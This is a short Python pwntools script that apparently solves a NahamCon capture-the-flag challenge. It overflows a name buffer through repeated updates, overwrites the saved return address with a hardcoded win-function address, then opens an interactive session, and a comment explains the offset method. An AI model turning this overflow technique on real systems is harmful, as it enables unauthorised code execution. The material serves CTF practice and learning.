from pwn import *

def add_user(name):
	p.sendlineafter("> ", "2")
	p.sendlineafter(": ", name)

def update_user(idx, name):
	p.sendlineafter("> ", "4")
	p.sendlineafter("? ", str(idx))
	p.sendafter("? ", name)


p = remote("challenge.nahamcon.com", 31980)
p.sendlineafter(": ", "robin")
add_user("AAA")
add_user("BBB")

'''
This had a buffer overflow vulnerability as it
takes more buffer than it holds in the name, doing so
we when we give around 80 bytes of data, it'll keep overwriting
the array of the name list, since the list is stored in the main's
block of stack, that being said, keep filling the array, find
offset to the RIP and overwrite it with win@plt function and
enjoy
'''

count = 2
for i in range(9):
	update_user(count, chr(65 + i)*80)
	count += 2
	if i == 7:
		update_user(count, b"A"*40 + p64(0x401369) + b"\n")
		break

p.sendlineafter("> ", "5")
p.interactive()